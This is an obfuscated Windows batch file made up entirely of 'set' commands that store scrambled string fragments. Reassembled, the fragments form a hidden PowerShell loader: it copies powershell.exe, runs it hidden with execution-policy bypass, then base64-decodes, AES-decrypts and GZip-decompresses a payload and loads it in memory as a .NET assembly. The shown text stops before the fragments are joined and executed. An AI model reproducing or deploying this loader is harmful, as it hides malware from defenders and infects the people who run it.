@echo off
set "WqmJcoXOks=\v"
set "ijyJPdVmAm=0\"
set "kxNoZxyeYz=nd"
set "aEmuYqRUWG=rS"
set "qngIVynrSu=st"
set "XWIaULvcTW=ll"
set "ZjChCunUPj=xe"
set "rLILvhvWvc=ws"
set "rdZAHGrkZq=ll"
set "ozlphrWACX=do"
set "gBRnKyUxGQ=we"
set "plkdfIggVh=co"
set "EQNAYYaAzK=em"
set "YwuQeWfPrq=\W"
set "GZrFfYhBIg=32"
set "pzcludzgvO=1."
set "HjMKvYhuFu=ow"
set "UOaZJRMwgV=po"
set "SkjjIhtZRC=Po"
set "NhtRkBqFPx=py"
set "cFpFSylfJM=we"
set "IZbotMlsUi=Wi"
set "lpGfONRDUZ=rs"
set "MOZYlPsehC=:\"
set "iyGKbEhVlW=.e"
set "ZSUcyiqgxh= /"
set "bzGsNDVBmd=in"
set "oSNgeFbWtl= C"
set "jlxnPoQyMs=s\"
set "hZfjkeqcGa=he"
set "vGEDRUfEWT=y "
set "uIbkboaKZO=Sy"
set "tLoXyBycCD=he"
set "zyZVpnfUjP=cd"
set "SnoChQNPpN= %~dp0"
set "wjUZhpctfx=fore"
set "pdbNxiKAJm=k.Su"
set "IoswPvbCXB=);$u"
set "SRscratXxN=mB, "
set "pdElzLZuvz=CuSj"
set "oRRlSUGODh=File"
set "wxucrXaOpc=dV1k"
set "octTQxoKEZ=Comp"
set "QDnbrSKDNJ=..-1"
set "WfsCKqDvpB=onve"
set "FwzMSycSNk= New"
set "fUroLlITIK=);$u"
set "DeuhGqMhWN=('%*'"
set "GadBVNNfnt=morF"
set "WRrJNUPZSd=m.IO"
set "GMAZKcoPot=join"
set "TPEyBAuCuz=Gsk."
set "nlssfvHoFJ=ment"
set "IlZuSGEeEs=ode]"
set "HlhPGbmrrM=$eyR"
set "pUlljyCIax=.Key"
set "PHRYPbSeqS=;$lk"
set "LyZuAtCjus=.Com"
set "rFdsVCLtps='oPV"
set "KTOtacdAmn=am;$"
set "VUuVuPgTeN=]::("
set "RSFJajJMfj=pher"
set "QRtQiXxXlH=ress"
set "kmHzntROth=tS46"
set "cNCPtNcrqB=3); "
set "nbmrqcORAf=8kuY"
set "aQzMAZzTsC=ke($"
set "UqTnTjPgOD=ptog"
set "OdAoypzFeY=[Sys"
set "EssJLuFijz=TFjf"
set "pkgCrMgZZo=pres"
set "PEaLYBDGum=.Ass"
set "uVOpKWwOBF=-1.."
set "MxflHJXRQp=('da"
set "WnabgTsxtI=New-"
set "bPgGLwpFhV=-joi"
set "YEpngRToHX=.GZi"
set "rWjCFwUsDE=.Mod"
set "sWMhQOGuYK=)($S"
set "kFntzVJkEV=Secu"
set "xjfFsEGrZz=[Sys"
set "zucnsrImpp=mk);"
set "NJLpHThfGb=yRal"
set "ZdbAPpPjYA=Cimk"
set "dApsJeROPt='gni"
set "KkvHacmRKw=R5jf"
set "jTbhVYvBwi=tion"
set "xfnPzvFPdp=).Sp"
set "kAaItVzhtn=ecry"
set "AUZewlwNAQ=HO3I"
set "NPAjOGKXGV=$lkc"
set "NdxwlDBpEP=bjec"
set "YKGQVWiled=IoO3"
set "tWNATZWXeL=.-16"
set "oieTrdRRcM=em.C"
set "XpnFAOdREU=.Cry"
set "VhmigifZmz=ck($"
set "rbBfJsthWX= = ["
set "gnsfmAJYGp=ress"
set "ERhseQJQAL=n ''"
set "fLSTgkfOge=m(, "
set "PewggGzYLV= '')"
set "rXyDQgpEwn=$aCi"
set "qmlnNhXRme=-nop"
set "yMOrldwyUO=rofi"
set "juzqlOWFdC=OjmY"
set "tuTodexgtG=PKCS"
set "wzeRBuUqVH=Conv"
set "isglPuZdaU=wg.D"
set "jjojNDbVzP=V = "
set "mNAaQklzBB=ose("
set "QlSsmPGbIw=TllA"
set "jvQGLTyelb=stem"
set "yVbfnzgEii=OjmY"
set "RurHTohqCZ=uOjm"
set "NEQdbygRzx=();$"
set "MgRtKJqtDA=mory"
set "OSJBPnQogn=mk.T"
set "EhSqbMedAB='txe"
set "uUGJanDhdB=orF'"
set "btfosbLWau=ect "
set "JLgQzxEDxC=aDNK"
set "KAcrZvsKXw=New-"
set "DYpywgCbpe=($eR"
set "gzgHtLVTvA=$PrK"
set "RfRCGTbwIl= '')"
set "uLwAaKWRdi=OjmY"
set "fQPaIexHjW=F'[-"
set "niqkYwWafL=)($e"
set "GmNZRQJKjA= [Sy"
set "SHXXcGOUmu=::('"
set "WHIagVlMke=al);"
set "niTyZcTSVc=ne);"
set "fwdCnseHsA=ypto"
set "ZTDhazLpRK=);$B"
set "RuHdGgsOXy=th('"
set "mVDjCuoEPe=raph"
set "XQwMLxTptR=rtS4"
set "IeMGJlPZsx=zm83"
set "PIseYdrpmU=rt]:"
set "HxnBrddchi=stem"
set "kcKGUJVnmo=.IO."
set "gjnplPyzlU=Comp"
set "UpgjeJHlqQ=ose("
set "BMGwkNxklp=.Sec"
set "allufneJDn=oint"
set "jVvqWukdMp=mY.I"
set "IgHXLlLDqI=ijHW"
set "juzZkQzqPI=DLn."
set "kHSbNdcyGA=;$lk"
set "GZPjFQKwdC=ateD"
set "pSlKnTUUlH=.Dis"
set "mmSTxhYBtx=m.Re"
set "XWwzQKyAew= = $"
set "KbhgsrddOV=ddin"
set "qcqoaNlhzp=Gsk "
set "OOUVqcvvzk=, (,"
set "nGvZmmIHaR=PrKm"
set "egvkHakTAE=tem."
set "WopdmlFGfw=.Cop"
set "JSuJxIHgBg=:: '"
set "xINnlrnRLs=y.Cr"
set "XggGEESJYg=ewLi"
set "ACZYtowVdp=rity"
set "BCfkawTZlI=nirt"
set "PJAFXFDoIC=eyRa"
set "EKyWaPChPU=esaB"
set "ulQbKSFmMj=comm"
set "LGjvffAdae=K.En"
set "SabjevcwDm=bypa"
set "ByDBpHxnkR=in $"
set "OjDadlWEwy=[]] "
set "xTVkcczBuN=kyhK"
set "aVffIaYzsZ=nage"
set "PPJukMyeHB= [Sy"
set "GnBUdlSttv=Y.Pa"
set "GHFJoQRWRQ=] -j"
set "omlbydyzIx=[Env"
set "uvKnXkNjmW=Disp"
set "XAbsXAVCOO=rity"
set "qwKnVluSuF=grap"
set "ssqyyFsUeE=oArr"
set "ejyRAjigDz=6] -"
set "WrkucXbXty=16] "
set "PHIVyXBKso=dM.T"
set "psIfHHjZyl=bq ="
set "dfmOrykGUX=tsWi"
set "JqiOUCIDCg=$eux"
set "QEHNxKlnXe=DNJS"
set "WBRTzzuOpR=Invo"
set "LJtyWjcUTa=ress"
set "JaLBAQnGtO=();$"
set "YtEcEssZKh=-Obj"
set "isElvFEDvE=$eyR"
set "cHWseuybYZ=oin "
set "HGamqFzIFY=]::C"
set "pukSjyhgQb='')("
set "onDLnHDQhK==');"
